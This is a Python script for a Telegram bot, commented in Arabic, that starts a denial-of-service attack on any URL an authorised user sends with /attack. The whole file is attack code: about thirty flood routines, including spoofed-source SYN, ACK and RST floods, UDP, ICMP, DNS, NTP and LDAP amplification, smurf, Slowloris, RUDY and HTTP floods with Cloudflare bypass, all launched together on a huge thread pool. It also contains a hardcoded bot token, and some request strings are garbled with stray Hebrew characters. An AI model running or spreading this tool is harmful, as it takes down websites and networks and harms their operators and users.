
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import cloudscraper
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import time
import socket
import ssl
import random
from scapy.all import *

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

scraper = cloudscraper.create_scraper()  # إنشاء كائن scraper لتجاوز Cloudflare

# قائمة المالكين والمستخدمين
Owner = ['6358035274']
NormalUsers = []

# استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
bot = telebot.TeleBot('7287602125:AAH9buxYlFiOo2kAUnkicgmRSo4NSx8lV6w')

# متغيرات التحكم في الهجوم
attack_in_progress = False
attack_lock = threading.Lock()
attack_counter = 0  # عداد الهجوم
error_logged = False  # متغير لتتبع تسجيل الأخطاء

def log_error_once(error_message):
    global error_logged
    if not error_logged:
        print(error_message)
        error_logged = True

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def random_user_agent():
    user_agents = [
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0',
        'Mozilla/5.0 (Android 9; Mobile; rv:67.0.3) Gecko/67.0.3 Firefox/67.0.3',
        'Mozilla/5.0 (Android 7.1.1; Tablet; rv:67.0) Gecko/67.0 Firefox/67.0',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/75.0.3770.27 Safari/537.36 OPR/62.0.3331.10 (Edition beta)',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML، مثل Gecko) Version/5.0.4 Safari/533.20.27',
        'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
        'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
        'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
        'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
        'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
        'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML، مثل Gecko) Chrome/15.0.874.120 Safari/535.2',
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML، مثل Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
        'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
        'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML، مثل Gecko) Chrome/12.0.712.0 Safari/534.27',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML، مثل Gecko) Chrome/13.0.782.24 Safari/535.1',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML، مثل Gecko) Chrome/16.0.912.36 Safari/535.7',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML، مثل Gecko) Chrome/20.0.1092.0 Safari/536.6',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
        'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML، مثل Gecko) Chrome/19.0.1061.1 Safari/536.3',
        'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML، مثل Gecko، Safari/419.3) Arora/0.8.0',
        'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
        'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML، مثل Gecko) Version/4.0.4 Safari/531.21.10',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML، مثل Gecko) Chrome/7.0.514.0 Safari/534.7',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML، مثل Gecko) Chrome/5.0.310.0 Safari/532.9',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML، مثل Gecko) Version/5.0.1 Safari/533.17.8',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)',
    ]
    return random.choice(user_agents)

def syn_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في syn_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def bypass_attack(host, port=443):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            context = ssl.create_default_context()
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    request = f"GET / HTTP/1.1\r\nHost: {host}\ר\nUser-Agent: {random_user_agent()}\ר\nX-Forwarded-For: {random_ip()}\ר\n\r\n".encode('utf-8')
                    ssock.sendall(request)
                    attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في bypass_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def flooding_requests_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            scraper.get(f"https://{host}", headers={'User-Agent': random_user_agent(), 'X-Forwarded-For': random_ip()})
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في flooding_requests_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def layer_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            scraper.post(f"https://{host}", data={"key": "value"}, headers={'User-Agent': random_user_agent(), 'X-Forwarded-For': random_ip()})
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في layer_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def http_get_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            request = f"GET / HTTP/1.1\r\nHost: {host}\ר\nUser-Agent: {random_user_agent()}\ר\nX-Forwarded-For: {random_ip()}\ר\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في http_get_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def http_post_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            request = f"POST / HTTP/1.1\r\nHost: {host}\ר\nContent-Length: 10\r\nUser-Agent: {random_user_agent()}\ר\nX-Forwarded-For: {random_ip()}\ר\n\r\nkey=value".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في http_post_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def udp_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = random._urandom(1024)
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(packet, (target_ip, target_port))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في udp_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def ping_flood(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في ping_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def dns_flood(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            query = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
            send(query, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في dns_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def slowloris_attack(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
            sock.send(f"Host: {target_ip}\ר\n".encode('utf-8'))
            sock.send("User-Agent: Mozilla/5.0\r\n".encode('utf-8'))
            sock.send("Connection: keep-alive\r\n".encode('utf-8'))
            attack_counter += 1
            time.sleep(15)  # إبقاء الاتصال مفتوحًا لفترة طويلة
    except Exception as e:
        log_error_once(f"حدث خطأ في slowloris_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def ntp_amplification(target_ip):
    global attack_in_progress, attack_counter
    ntp_server = "pool.ntp.org"
    ntp_packet = b'\x17' + 47 * b'\x00'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(ntp_packet, (ntp_server, 123))
                sock.sendto(ntp_packet, (target_ip, 123))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في ntp_amplification: {e}\נ تفاصیل الخطأ: {str(e)}")

def ldap_amplification(target_ip):
    global attack_in_progress, attack_counter
    ldap_server = "ldap.forumsys.com"
    ldap_packet = b'\x30\x84\x00\x00\x00\x0b\x02\x01\x01\x60\x84\x00\x00\x00\x03\x02\x01\x03'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(ldap_packet, (ldap_server, 389))
                sock.sendto(ldap_packet, (target_ip, 389))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في ldap_amplification: {e}\נ تفاصیل الخطأ: {str(e)}")

def snmp_flood(target_ip):
    global attack_in_progress, attack_counter
    snmp_packet = b'\x30\x29\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa1\x1c\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(snmp_packet, (target_ip, 161))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في snmp_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def http_head_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            request = f"HEAD / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\ר\nX-Forwarded-For: {random_ip()}\ר\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في http_head_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def rudy_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            with socket.create_connection((host, 80)) as sock:
                sock.send(f"POST / HTTP/1.1\r\nHost: {host}\ר\nContent-Length: 1000000\r\n\r\n".encode('utf-8'))
                for _ in range(1000):
                    if not attack_in_progress:
                        break
                    sock.send(b"a")
                    time.sleep(1)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في rudy_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def http_mix_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            request_type = random.choice(["GET", "POST", "HEAD"])
            if request_type == "POST":
                request = f"POST / HTTP/1.1\r\nHost: {host}\ר\nContent-Length: 10\r\nUser-Agent: {random_user_agent()}\ר\nX-Forwarded-For: {random_ip()}\ר\n\r\nkey=value".encode('utf-8')
            else:
                request = f"{request_type} / HTTP/1.1\r\nHost: {host}\ר\nUser-Agent: {random_user_agent()}\ר\nX-Forwarded-For: {random_ip()}\ר\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في http_mix_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def sip_flood(target_ip):
    global attack_in_progress, attack_counter
    sip_packet = b'INVITE sip:bob@biloxi.com SIP/2.0\r\nVia: SIP/2.0/UDP pc33.atlanta.com;branch=z9hG4bK776asdhds\r\nMax-Forwards: 70\r\nTo: Bob <sip:bob@biloxi.com>\r\nFrom: Alice <sip:alice@atlanta.com>;tag=1928301774\r\nCall-ID: a84b4c76e66710\r\nCSeq: 314159 INVITE\r\nContact: <sip:alice@pc33.atlanta.com>\r\nContent-Type: application/sdp\r\nContent-Length: 0\r\n\r\n'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(sip_packet, (target_ip, 5060))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في sip_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def smurf_attack(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = IP(src=target_ip, dst="255.255.255.255")/ICMP()
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في smurf_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def fragmented_packet_attack(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip, flags="MF") / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S")
            send(fragment(packet), verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في fragmented_packet_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def http_range_header_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            request = f"GET / HTTP/1.1\r\nHost: {host}\ר\nUser-Agent: {random_user_agent()}\ר\nRange: bytes=0-18446744073709551615\r\nX-Forwarded-For: {random_ip()}\ר\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في http_range_header_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def reflected_xss_attack(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            payload = f"<script>fetch('http://{target_ip}')</script>"
            with socket.create_connection((target_ip, 80)) as sock:
                request = f"GET /search?q={payload} HTTP/1.1\r\nHost: {target_ip}\ר\nUser-Agent: {random_user_agent()}\ר\nX-Forwarded-For: {random_ip()}\ר\n\r\n".encode('utf-8')
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في reflected_xss_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def tcp_reset_attack(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="R")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في tcp_reset_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def http_slow_read_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\ר\nUser-Agent: {random_user_agent()}\ר\nX-Forwarded-For: {random_ip()}\ר\n\r\n".encode('utf-8'))
                time.sleep(5)
                sock.recv(1024)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في http_slow_read_attack: {e}\נ تفاصیل الخطأ: {str(e)}")

def syn_ack_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="SA")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في syn_ack_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def icmp_echo_flood(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = IP(dst=target_ip)/ICMP(type="echo-request")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في icmp_echo_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def http_connection_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            with socket.create_connection((host, 80)):
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في http_connection_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def ack_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="A")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في ack_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def fin_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="F")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في fin_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def rst_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="R")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في rst_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def icmp_time_exceeded_flood(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = IP(dst=target_ip)/ICMP(type="time-exceeded")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في icmp_time_exceeded_flood: {e}\נ تفاصیل الخطأ: {str(e)}")

def http_cookie_bomb(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            cookies = "; ".join([f"cookie{i}=value{i}" for i in range(1000)])
            request = f"GET / HTTP/1.1\r\nHost: {host}\ר\nUser-Agent: {random_user_agent()}\ר\nCookie: {cookies}\ר\nX-Forwarded-For: {random_ip()}\ר\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"حدث خطأ في http_cookie_bomb: {e}\נ تفاصیل الخطأ: {str(e)}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "مرحباً! أرسل لي رابط الهدف للبدء في الهجوم.")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global attack_in_progress, error_logged
    with attack_lock:
        attack_in_progress = False
    error_logged = False  # إعادة تعيين تسجيل الخطأ عند إيقاف الهجوم
    bot.reply_to(message, "تم إيقاف الهجوم.")
    bot.send_message(message.chat.id, "الهجوم تم إيقافه بنجاح.")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    global attack_in_progress, attack_counter, error_logged
    if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
        try:
            url = message.text.split()[1]  # افتراض أن الرابط يأتي بعد الأمر مباشرة
            host = url.split("//")[-1].split("/")[0]  # استخراج اسم المضيف من الرابط
            target_ip = socket.gethostbyname(host)  # الحصول على عنوان IP من اسم المضيف

            with attack_lock:
                attack_in_progress = True
                attack_counter = 0
                error_logged = False  # إعادة تعيين تسجيل الخطأ عند بدء هجوم جديد

            bot_message = bot.send_message(message.chat.id, f"الهجوم بدأ على {url}.\נالهجوم مستمر: 0")

            def update_message():
                while attack_in_progress:
                    time.sleep(1)  # تحديث كل ثانية
                    try:
                        bot.edit_message_text(chat_id=bot_message.chat.id, message_id=bot_message.message_id, text=f"الهجوم مستمر: {attack_counter}")
                    except Exception as e:
                        print("حدث خطأ أثناء تحديث الرسالة:", e)

            threading.Thread(target=update_message).start()

            with ThreadPoolExecutor(max_workers=100000) as executor:  # عدد أكبر من الخيوط
                while attack_in_progress:
                    executor.submit(syn_flood, target_ip, 80)  # هجوم SYN flood على منفذ 80
                    executor.submit(bypass_attack, host)
                    executor.submit(flooding_requests_attack, host)
                    executor.submit(layer_attack, host)
                    executor.submit(http_get_flood, host)
                    executor.submit(http_post_flood, host)
                    executor.submit(udp_flood, target_ip, 80)
                    executor.submit(ping_flood, target_ip)
                    executor.submit(dns_flood, target_ip)
                    executor.submit(slowloris_attack, target_ip, 80)
                    executor.submit(ntp_amplification, target_ip)
                    executor.submit(ldap_amplification, target_ip)
                    executor.submit(snmp_flood, target_ip)
                    executor.submit(http_head_flood, host)
                    executor.submit(rudy_attack, host)
                    executor.submit(http_mix_flood, host)
                    executor.submit(sip_flood, target_ip)
                    executor.submit(smurf_attack, target_ip)
                    executor.submit(fragmented_packet_attack, target_ip, 80)
                    executor.submit(http_range_header_attack, host)
                    executor.submit(reflected_xss_attack, target_ip)
                    executor.submit(tcp_reset_attack, target_ip, 80)
                    executor.submit(http_slow_read_attack, host)
                    executor.submit(syn_ack_flood, target_ip, 80)
                    executor.submit(icmp_echo_flood, target_ip)
                    executor.submit(http_connection_flood, host)
                    executor.submit(ack_flood, target_ip, 80)
                    executor.submit(fin_flood, target_ip, 80)
                    executor.submit(rst_flood, target_ip, 80)
                    executor.submit(icmp_time_exceeded_flood, target_ip)
                    executor.submit(http_cookie_bomb, host)
        except IndexError:
            bot.reply_to(message, "استخدم /attack <الرابط>")
    else:
        bot.reply_to(message, "عذراً، أنت غير مصرح لك باستخدام هذه الأداة.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    bot.reply_to(message, "استخدم /attack <الرابط> لبدء الهجوم أو /stop لإيقاف الهجوم.")

bot.polling()
